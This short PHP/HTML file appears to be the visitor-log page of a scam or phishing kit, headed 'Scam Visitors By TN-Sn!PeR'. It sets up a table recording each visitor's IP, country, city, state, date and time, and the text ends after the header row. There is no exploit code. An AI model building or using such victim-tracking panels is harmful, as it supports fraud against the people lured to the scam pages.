<?

$row = count($ip);

?>

<head>

<title>Scam Visitors By TN-Sn!PeR</title>


    <style type="text/css">
        .body {
            text-align: center;
        }
        .auto-style3 {
			font-family: Calibri;
            font-weight: bold;
            font-size: medium;
            color: white;
            text-align: center;
        }
    .auto-style4 {
		font-family: Calibri;
		font-weight: bold;
		font-size: medium;
		text-align: center;
	}
    .auto-style5 {
		font-family: Calibri;
		font-size: xx-large;
	}
	.auto-style6 {
		font-family: Calibri;
	}
	
	
	table, th, td
{
border-collapse:collapse;
border:1px solid black;
}
th, td
{
padding:5px;
}
    </style>
	
	

</head>



<div class="body">



    <span class="auto-style5">Scam Visitors By Tn-Sn!PeR</span>


    <br class="auto-style6">
    <br class="auto-style6">
    <center>
        <table border="1" cellpadding="0" cellspacing="0" id="rez" style="border-collapse: collapse;" height="50pt">
            <colgroup>
                <col span="6" style="mso-width-source:userset;mso-width-alt:2962;
 width:61pt" height="100pt">
            </colgroup>
            <tr>
				<th class="auto-style3" style="width: 150pt; background: #C0504D;">
                    IP</th>
                <th class="auto-style3" style="width: 100pt;background: #C0504D;">
                    Country</th>
                <th class="auto-style3" style="width: 80pt;background: #C0504D;">
                    City</th>
                <th class="auto-style3" style="width: 80pt;background: #C0504D;">
                    State</th>
                <th class="auto-style3" style="width: 80pt;background: #C0504D;">
                    Date</th>
                <th class="auto-style3" style="width: 80pt;background: #C0504D;">
                    Time</th>
            </tr>